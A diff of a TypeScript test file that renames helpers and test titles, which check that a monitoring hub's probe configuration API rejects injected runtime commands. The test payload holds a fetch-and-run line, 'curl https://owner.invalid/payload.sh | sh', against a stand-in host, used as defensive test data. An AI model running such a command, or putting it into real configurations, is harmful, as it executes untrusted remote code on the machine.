@@ -114,7 +114,7 @@ async function registerProbe(
   return { ...registration, privateKeyPem: identity.privateKeyPem };
 }
 
-const privilegedRuntimeInjectionPayload = {
+const localPrivilegeBoundaryInjectionPayload = {
   args: ["--network=host", "--timeout=600", "https://owner.invalid/payload"],
   code: "console.log('owner runtime code')",
   command: "curl https://owner.invalid/payload.sh | sh",
@@ -126,7 +126,7 @@ const privilegedRuntimeInjectionPayload = {
   timeoutSeconds: 600,
 };
 
-function expectNoPrivilegedRuntimeInjection(value: unknown) {
+function expectNoLocalPrivilegeBoundaryInjection(value: unknown) {
   const serialized = JSON.stringify(value);
 
   for (const key of [
@@ -319,7 +319,7 @@ describe("Probe Configuration API", () => {
     database.close();
   });
 
-  it("does not let Owner Probe Configuration inject privileged runtime commands or policy", async () => {
+  it("does not let Owner Probe Configuration inject local privilege boundary helper commands or policy", async () => {
     const database = await createTemporaryDatabase();
     const app = createHubApp({
       auth: {
@@ -338,8 +338,8 @@ describe("Probe Configuration API", () => {
       body: JSON.stringify({
         ...probeConfigurationInput(),
         metricsCollectionIntervalSeconds: 10,
-        privilegedRuntime: privilegedRuntimeInjectionPayload,
-        ...privilegedRuntimeInjectionPayload,
+        privilegedRuntime: localPrivilegeBoundaryInjectionPayload,
+        ...localPrivilegeBoundaryInjectionPayload,
       }),
       headers: {
         "content-type": "application/json",
@@ -352,19 +352,19 @@ describe("Probe Configuration API", () => {
     const updated = (await updateResponse.json()) as {
       configuration: Record<string, unknown>;
     };
-    expectNoPrivilegedRuntimeInjection(updated.configuration);
+    expectNoLocalPrivilegeBoundaryInjection(updated.configuration);
 
     const probeConfiguration = await fetchProbeConfiguration(
       app,
       registration,
       "default-v1",
     );
-    expectNoPrivilegedRuntimeInjection(probeConfiguration);
+    expectNoLocalPrivilegeBoundaryInjection(probeConfiguration);
 
     database.close();
   });
 
-  it("does not let Host Probe Configuration overrides inject privileged runtime commands or policy", async () => {
+  it("does not let Host Probe Configuration overrides inject local privilege boundary helper commands or policy", async () => {
     const database = await createTemporaryDatabase();
     const app = createHubApp({
       auth: {
@@ -393,8 +393,8 @@ describe("Probe Configuration API", () => {
           configuration: {
             ...probeConfigurationInput(),
             metricsCollectionIntervalSeconds: 10,
-            privilegedRuntime: privilegedRuntimeInjectionPayload,
-            ...privilegedRuntimeInjectionPayload,
+            privilegedRuntime: localPrivilegeBoundaryInjectionPayload,
+            ...localPrivilegeBoundaryInjectionPayload,
           },
           mode: "override",
         }),
@@ -412,7 +412,7 @@ describe("Probe Configuration API", () => {
       mode: "override";
     };
     expect(override.mode).toBe("override");
-    expectNoPrivilegedRuntimeInjection(override.configuration);
+    expectNoLocalPrivilegeBoundaryInjection(override.configuration);
 
     const effectiveResponse = await app.request(
       `/api/web/hosts/${hostId}/probe-configuration`,
@@ -423,7 +423,7 @@ describe("Probe Configuration API", () => {
       },
     );
     expect(effectiveResponse.status).toBe(200);
-    expectNoPrivilegedRuntimeInjection(await effectiveResponse.json());
+    expectNoLocalPrivilegeBoundaryInjection(await effectiveResponse.json());
 
     const probeConfiguration = await fetchProbeConfiguration(
       app,
@@ -431,7 +431,7 @@ describe("Probe Configuration API", () => {
       "default-v1",
     );
     expect(probeConfiguration.version).toBe(override.configuration.version);
-    expectNoPrivilegedRuntimeInjection(probeConfiguration);
+    expectNoLocalPrivilegeBoundaryInjection(probeConfiguration);
 
     database.close();
   });
